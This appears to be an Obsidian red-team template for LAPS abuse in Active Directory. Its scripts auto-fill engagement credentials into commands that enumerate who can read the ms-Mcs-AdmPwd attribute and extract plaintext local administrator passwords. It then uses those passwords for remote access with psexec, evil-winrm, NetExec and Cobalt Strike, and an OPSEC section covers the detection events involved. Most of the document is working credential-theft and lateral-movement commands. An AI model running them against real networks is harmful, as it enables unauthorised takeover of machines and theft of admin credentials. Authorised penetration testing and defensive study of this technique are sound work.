---
# Attack-specific fields
laps_target_computer:
laps_read_principal:
laps_password:
notes:
---

# LAPS Abuse — Local Administrator Password Solution

> [!abstract] Attack Summary
> **LAPS** stores a unique local Administrator password for each domain-joined computer in the `ms-Mcs-AdmPwd` attribute of the computer object. By default, only certain groups/users can read this attribute. If your account has **read access**, you can extract the plaintext password for any targeted machine's local admin account.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Target Computer (sAMAccountName)", `\`INPUT[text:laps_target_computer]\``],
  ["Principal with Read Access",       `\`INPUT[text:laps_read_principal]\``],
]);
```

---

## Step 1 — Check if LAPS is Deployed

**Windows — Check schema**
```dataviewjs
dv.paragraph("```bash\n# Check if LAPS schema extension exists\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(objectClass=attributeSchema)\" --attributes name --dn \"CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=...\"\n\n# PowerShell\nGet-ADObject 'CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=domain,DC=local' -Properties *\n```");
```

**Linux**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const domParts = domain.split('.').map(x => "DC=" + x).join(',');
dv.paragraph("```bash\n# Check for LAPS schema attribute\nldapsearch -x -H ldap://" + dc_ip + " -D '" + username + "@" + domain + "' -w '" + password + "' " +
  "-b 'CN=Schema,CN=Configuration," + domParts + "' '(name=ms-Mcs-AdmPwd)' name\n\n# Check computer objects for ms-Mcs-AdmPwd\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -M laps\n```");
```

---

## Step 2 — Enumerate Who Can Read LAPS Passwords

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "domain.local";
dv.paragraph("```powershell\n# Find which OUs/computers have LAPS enabled\nGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | " +
  "?{ $_.ObjectAceType -match 'ms-Mcs-AdmPwd' } | " +
  "Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier\n\n# Find principals with read access to ms-Mcs-AdmPwd\nGet-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | " +
  "?{ $_.ObjectAceType -match 'ms-Mcs-AdmPwd' -and $_.ActiveDirectoryRights -match 'ReadProperty' }\n```");
```

**Linux — NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Check LAPS read permissions\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -M laps --options\n\n# Enumerate who can read\nimpacket-dacledit " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + " -action read -target-dn 'CN=TARGET_COMPUTER,...'\n```");
```

---

## Step 3 — Read LAPS Password

**Windows — PowerView / Native**
```dataviewjs
const p = dv.current();
const targetComp = p?.laps_target_computer || "TARGET_COMPUTER";
dv.paragraph("```powershell\n# PowerView\nGet-DomainComputer -Identity '" + targetComp + "' -Properties ms-Mcs-AdmPwd | Select -ExpandProperty ms-Mcs-AdmPwd\n\n# Native PowerShell (LAPS module)\nGet-AdmPwdPassword -ComputerName '" + targetComp + "'\n\n# Native LDAP\nGet-ADComputer -Identity '" + targetComp + "' -Properties ms-Mcs-AdmPwd\n```");
```

**Windows — ADSearch**
```dataviewjs
const p = dv.current();
const targetComp = p?.laps_target_computer || "TARGET_COMPUTER";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(samaccountname=" + targetComp + "$)\" --attributes ms-Mcs-AdmPwd,samaccountname,dnshostname\n```");
```

**Linux — NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const dc_ip      = b?.dc_ip  ?? "DC_IP";
const username   = b?.username ?? "USER";
const password   = b?.password ?? "PASSWORD";
const targetComp = p?.laps_target_computer || "TARGET_COMPUTER";
dv.paragraph("```bash\n# Read LAPS password for specific computer\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -M laps --computername '" + targetComp + "'\n\n# All computers\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -M laps\n\n# Manual LDAP query\nldapsearch -x -H ldap://" + dc_ip + " -D '" + username + "@" + domain + "' -w '" + password + "' -b 'DC=" + domain.split('.').join(',DC=') + "' '(sAMAccountName=" + targetComp + "$)' ms-Mcs-AdmPwd\n```");
```

LAPS Password recovered: `INPUT[text:laps_password]`

---

## Step 4 — Use LAPS Password for Access

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const target     = p?.laps_target_computer || "TARGET_COMPUTER";
const password   = p?.laps_password || "LAPS_PASSWORD";
const domain     = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\n# SMB / PSExec\nimpacket-psexec ./" + target + ":'" + password + "'@" + target + "\n\n# WinRM\nevil-winrm -i " + target + " -u 'administrator' -p '" + password + "'\n\n# NetExec\nnxc smb " + target + " -u 'administrator' -p '" + password + "' --local-auth\n\n# Cobalt Strike (after make_token)\nmake_token .\\administrator " + password + "\njump psexec64 " + target + " LISTENER\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - LDAP reads of `ms-Mcs-AdmPwd` generate **Event 4662** (directory service access) with the attribute GUID if auditing enabled.
> - Multiple LAPS reads in quick succession may trigger alerts.
> - LAPS passwords rotate periodically — check expiry time (`ms-Mcs-AdmPwdExpirationTime`).
> - If LAPS v2 (Windows LAPS) is deployed, it uses `msLAPS-Password` or `msLAPS-EncryptedPassword`.

---

## Notes & Results

`INPUT[textarea:notes]`
